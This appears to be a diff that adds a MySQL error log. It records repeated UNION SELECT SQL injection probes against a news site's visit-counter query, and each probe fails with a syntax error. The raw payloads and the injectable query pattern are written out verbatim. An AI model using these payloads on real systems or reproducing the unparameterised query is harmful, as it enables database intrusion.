+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45) -- /* order by "as /*
+
+Time : 10:29:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45) -- /* order by "as /*
+
+Time : 10:29:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45) -- /* order by "as /*
+
+Time : 10:29:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45) -- /* order by "as /*
+
+Time : 10:29:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) -- /* order by "as /*
+
+Time : 10:29:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45) -- /* order by "as /*
+
+Time : 10:29:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45) -- /* order by "as /*
+
+Time : 10:29:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45) -- /* order by "as /*
+
+Time : 10:29:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45) -- /* order by "as /*
+
+Time : 10:29:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45) -- /* order by "as /*
+
+Time : 10:29:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45) -- /* order by "as /*
+
+Time : 10:29:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45) -- /* order by "as /*
+
+Time : 10:29:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45) -- /* order by "as /*
+
+Time : 10:29:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45) -- /* order by "as /*
+
+Time : 10:29:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45) -- /* order by "as /*
+
+Time : 10:29:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45) -- /* order by "as /*
+
+Time : 10:29:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45) -- /* order by "as /*
+
+Time : 10:29:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45) -- /* order by "as /*
+
+Time : 10:29:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45) -- /* order by "as /*
+
+Time : 10:29:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45) -- /* order by "as /*
+
+Time : 10:29:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by ' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by "as /*
+
+Time : 10:29:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by "as /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by "as /*
+
+Time : 10:29:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:35
